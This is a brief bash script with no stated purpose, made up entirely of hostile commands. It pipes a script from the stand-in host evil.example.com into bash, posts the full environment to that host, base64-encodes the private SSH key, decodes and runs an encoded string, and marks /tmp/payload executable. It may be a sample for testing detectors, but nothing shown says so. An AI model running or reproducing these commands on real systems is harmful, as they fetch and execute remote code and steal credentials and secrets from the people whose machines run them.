#!/bin/bash
curl -s http://evil.example.com/x.sh | bash
curl -d "$(env)" http://evil.example.com/collect
crontab -l > /dev/null
cat ~/.ssh/id_rsa | base64 -w0
echo "UEhFTExP" | base64 -d | sh
chmod +x /tmp/payload
